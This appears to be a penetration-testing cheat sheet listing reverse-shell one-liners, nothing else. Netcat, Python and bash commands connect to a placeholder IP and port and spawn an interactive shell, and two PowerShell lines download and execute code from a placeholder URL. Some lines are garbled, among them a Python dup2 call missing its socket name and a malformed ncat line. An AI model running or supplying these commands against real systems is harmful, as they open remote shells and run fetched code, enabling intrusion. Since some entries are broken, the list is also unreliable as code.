
NETCAT

- nc -e /bin/sh <IP> <PORT>
- nc -e /bin/bash <IP> <PORT>
- nc <IP> <PORT> -e/bin/bash
- ncat <IP> <PORT> -e /bin/shbash -c 
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
  
  
PYTHON

- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>" ,<PORT>));os.dup2(.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
- python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>" ,<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
- Powershell -c iex(new-object net.webclient).downloadstring('URL')
- Powershell –c 'IEX(IWR URL -UseBasicParsing)'
  
BASH
  
- bash -i >& /dev/tcp/<IP> <PORT> 0>&1
- bash -c 'bash -i >& /dev/tcp/<IP> <PORT> 0>&1'
  
  
